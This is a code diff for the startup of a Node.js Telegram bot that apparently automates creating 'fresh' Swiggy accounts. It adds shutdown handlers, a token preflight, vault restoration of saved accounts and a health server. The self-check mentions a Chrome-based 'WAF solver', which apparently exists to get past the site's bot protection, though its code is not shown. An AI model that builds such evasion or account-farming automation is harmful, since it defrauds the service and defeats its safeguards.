+//  3) SIGINT/SIGTERM handlers `await bot.launch()` ke BAAD lage the — launch
+//     wala promise bot band hone par hi resolve hota hai, matlab handlers
+//     kabhi register hi nahi hote the. Ab pehle lagte hain.
+// ---------------------------------------------------------------------------
+let shuttingDown = false;
+const shutdown = (signal) => {
+  if (shuttingDown) return;
+  shuttingDown = true;
+  console.log(`[FreshBot] ${signal} mila — batch rok kar band kar raha hoon…`);
+  try { requestAutopilotStop(signal); } catch {}
+  try { bot.stop(signal); } catch {}
+  setTimeout(() => process.exit(0), 1500).unref?.();
+};
+process.once('SIGINT', () => shutdown('SIGINT'));
+process.once('SIGTERM', () => shutdown('SIGTERM'));
+
+// Startup self-check — console me pehli nazar me sab dikh jaye
+{
+  const nodeMajor = Number(String(process.versions.node).split('.')[0]) || 0;
+  console.log(`[FreshBot] Node ${process.version}${nodeMajor < 20 ? '  ⚠️ Node 20+ chahiye — nodejs.org se update karo, warna kuch bhi kabhi bhi toot sakta hai!' : ''}`);
+  try {
+    const c = getChromeStatus();
+    console.log(c.found
+      ? `[FreshBot] Chrome ✅ ${c.path}${c.headless ? ' (headless)' : ''}`
+      : '[FreshBot] Chrome ❌ nahi mila — WAF solver nahi chalega. Chrome install karo ya .env me PUPPETEER_EXECUTABLE_PATH do. (Bot phir bhi chalega, /diag dekho.)');
+  } catch {}
+  console.log(`[FreshBot] Firebase ${isFirebaseConfigured() ? '✅ configured' : '❌ config nahi — FIREBASE_DB_URL / Settings → Firebase Sources'}`);
+  console.log(`[FreshBot] Owner gate: ${ownerIds() ? 'OWNER_IDS (.env)' : 'store bossIds + default (OWNER_IDS khali hai)'}`);
 }
 
-process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', () => bot.stop('SIGTERM'));
+const sleepMs = (ms) => new Promise((r) => setTimeout(r, ms));
+const tgCode = (e) => Number(e?.code ?? e?.response?.error_code ?? 0) || 0;
+const isNetErr = (e) => /fetch|network|socket|TLS|ECONN|ETIMEDOUT|EAI_AGAIN|timed? ?out|disconnected/i.test(`${e?.name || ''} ${e?.message || ''}`);
+
+// Token + internet pehle test karo (getMe) — network par retry, token galat
+// ho to turant saaf wajah. Bina is test ke bot chup-chaap "launch failed"
+// bolkar mar jata tha.
+async function preflight() {
+  for (let attempt = 1; attempt <= 6; attempt++) {
+    try {
+      const me = await bot.telegram.getMe();
+      console.log(`[FreshBot] Telegram ✅ @${me.username} (id ${me.id})`);
+      // Agar is token par kahin webhook laga ho (purana server, ya token
+      // leak hone par kisi aur ne lagaya ho) to polling 409 marega aur bot
+      // kabhi chalega hi nahi — isliye shuru me webhook saaf kar do.
+      await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {});
+      return me;
+    } catch (e) {
+      const code = tgCode(e);
+      if (code === 401) {
+        console.error('❌ BOT_TOKEN galat hai ya revoke ho chuka hai (Telegram 401).');
+        console.error('   Fix: Telegram me @BotFather → /mybots → apna bot → API Token → naya token lo,');
+        console.error('   .env ki BOT_TOKEN= wali line me naya token daalo, phir npm start.');
+        process.exit(1);
+      }
+      const waitSec = Math.min(3 * 2 ** (attempt - 1), 30);
+      const retryable = isNetErr(e) || code === 429 || code >= 500 || code === 0;
+      console.error(`[FreshBot] Telegram se connect nahi hua (try ${attempt}/6): ${e?.message || e}`);
+      if (!retryable || attempt === 6) {
+        console.error('❌ Internet/Telegram tak pahunch hi nahi paya. Net check karo (VPN/firewall?), phir npm start.');
+        process.exit(1);
+      }
+      console.log(`[FreshBot] ${waitSec}s ruk kar dobara try…`);
+      await sleepMs(waitSec * 1000);
+    }
+  }
+}
+
+// ---------------------------------------------------------------------------
+// ☁️ Cloud-vault hydrate (Render ke liye khaas zaroori) — bina persistent
+// disk ke har deploy/restart par data/db.json fresh banta hai aur saare
+// saved accounts chale jate. Vault configured ho (GITHUB_VAULT_TOKEN +
+// VAULT_ENCRYPTION_KEY) to accounts GitHub vault se wapas aa jate hain.
+// Pehle ye function store me tha lekin bot ise KABHI bulata hi nahi tha.
+// 12s timeout: vault slow/fail ho to bot startup atke nahi.
+// ---------------------------------------------------------------------------
+try {
+  const hydrated = await Promise.race([
+    hydrateAccountsFromCloudVault(),
+    sleepMs(12_000).then(() => null),
+  ]);
+  if (hydrated) console.log(`[FreshBot] Cloud vault hydrate: ${hydrated.restored}/${hydrated.total} accounts wapas aaye.`);
+} catch (e) {
+  console.warn('[FreshBot] Cloud vault hydrate skipped:', e?.message || e);
+}
+
+// ---------------------------------------------------------------------------
+// ❤️ Health server (sirf tab jab PORT env ho — Render Web Service par
+// Render khud PORT deta hai aur port khula na mile to deploy fail kar deta
+// hai). Worker/local par PORT nahi hota → ye bilkul band rehta hai.
+// GET / ya /health → { ok, bot running?, uptime } JSON.
+// ---------------------------------------------------------------------------
+if (process.env.PORT) {
+  try {
+    const { createServer } = await import('node:http');
+    const bootAt = Date.now();
+    createServer((req, res) => {
+      let snap = {};
+      try { snap = getAutopilotSnapshot(); } catch {}
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({
+        ok: true,
+        service: 'swiggy-fresh-bot',
+        uptimeSec: Math.floor((Date.now() - bootAt) / 1000),
+        batchRunning: Boolean(snap.running),
+        freshThisRun: snap.fresh ?? 0,
+      }));
+    }).listen(Number(process.env.PORT), '0.0.0.0', () => {
+      console.log(`[FreshBot] Health server port ${process.env.PORT} par sun raha hai (Render Web Service ke liye).`);
+    });
+  } catch (e) {
+    console.warn('[FreshBot] Health server start nahi hua:', e?.message || e);
+  }
+}
+
+await preflight();
+
+try {
+  await bot.launch({ dropPendingUpdates: true }, () => {
+    console.log('🆕 Swiggy Fresh Bot chal raha hai — START dabao, phone chhod ke aa jao. (/diag = health check)');
+  });
+} catch (e) {
+  const code = tgCode(e);
+  if (code === 409) {
+    console.error('❌ Telegram 409 Conflict — isi BOT_TOKEN se bot ki DOOSRI copy pehle se chal rahi hai.');
+    console.error('   Fix: purani copy band karo (doosra terminal/server/PC jahan bot chal raha ho),');
+    console.error('   phir yahan npm start. Ek token = ek hi copy ek waqt par.');
+  } else if (code === 401) {
+    console.error('❌ Telegram 401 — BOT_TOKEN revoke/galat. @BotFather se naya token lekar .env me daalo.');
+  } else {
+    console.error('[FreshBot] launch failed:', e?.stack || e?.message || e);
+  }
+  process.exit(1);
+}
